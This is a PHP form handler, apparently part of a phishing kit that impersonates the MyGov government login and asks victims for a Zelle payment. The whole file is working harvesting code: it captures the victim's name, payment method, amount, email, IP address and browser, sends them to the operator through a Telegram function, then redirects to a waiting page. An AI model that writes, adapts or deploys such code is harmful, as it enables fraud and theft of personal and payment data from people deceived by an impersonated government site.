<?php
include("config/config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $name = $_POST['name'];
    $amount = $_POST['amount'];
    $zelle = $_POST['zelle'];
    $email = $_POST['email'];
    $serv = $_REQUEST['zel'];


        //Telegram send
        $message = "**MY.gov-Login1\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "METHOD: ".$_POST['zelle']."\n";
        $message .= "----------------------------------------\n";
        $message .= "NAME: ".$_POST['name']."\n";
        $message .= "----------------------------------------\n";
        $message .= "AMOUNT: ".$_POST['amount']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['email']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:wait2.html");
?>
